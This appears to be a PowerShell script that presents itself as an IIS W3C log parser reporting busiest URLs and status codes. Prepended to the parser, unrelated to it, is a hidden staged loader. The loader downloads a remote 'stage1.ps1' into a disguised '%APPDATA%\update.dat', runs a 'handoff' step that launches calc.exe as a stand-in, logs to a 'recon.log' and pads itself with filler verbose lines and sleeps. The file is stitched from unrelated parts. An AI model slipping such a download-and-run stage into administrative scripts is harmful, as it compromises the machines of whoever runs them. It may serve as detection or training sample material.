[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://127.0.0.1/stage1.ps1',
    [string]$LocalPath = "$env:APPDATA\update.dat",
    [string]$StageLog = "$env:TEMP\recon.log",
    [int]$ConnectionTimeout = 93
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 93
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

Write-Verbose "Starting multi-stage workflow"
$StageResult = Invoke-Stage1Download -SourceUrl $Stage1Url -DestinationPath $LocalPath -TimeoutSec $ConnectionTimeout
if ($StageResult) {
    $HandoffResult = Invoke-Stage2Execution -StagedPath $LocalPath
    Write-Verbose ("Handoff result: " + $HandoffResult)
}
else {
    Write-Warning "First stage did not complete"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $Stage1Url
    Destination = $LocalPath
    TimeoutSec = $ConnectionTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Operation completed"
Write-Verbose "Validating result"
Write-Verbose "Applying operation timeout"
Write-Verbose "Checking local path"
Write-Verbose "Inspecting process list"
Write-Verbose "Starting workflow"
Write-Verbose "Preparing working directory"
Write-Verbose "Cleaning temporary marker"
$StageMarker = "stage-13"
Start-Sleep -Seconds 31
<#
.SYNOPSIS
    Parses IIS W3C logs and reports the busiest URLs and status codes.
.DESCRIPTION
    Reads the newest log files below the configured site folder, discovers the
    field order from the #Fields header and aggregates requests, errors and
    transferred bytes.
    The output is a CSV file that can be opened in Excel or forwarded to the web
    operations mailbox.
.PARAMETER LogRoot
    Overrides the default value defined in the parameter block.
.PARAMETER Days
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Parse-W3CLog.ps1 -Days 14 -TopN 5
.NOTES
    Author: Server Operations
    Last updated: 2024-05-12
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$LogRoot = "C:\inetpub\logs\LogFiles\W3SVC1",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 14,

    [int]$TopN = 5,
    [string]$OutputPath = 'C:\Reports\iis-top-2024-11-12.csv',

    [string]$HtmlPath = 'D:\Ops\reports\iis-2024-11-12.html'
)

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}
$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$topUrls | Export-Csv -NoTypeInformation -Path $OutputPath -Encoding UTF8
Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize
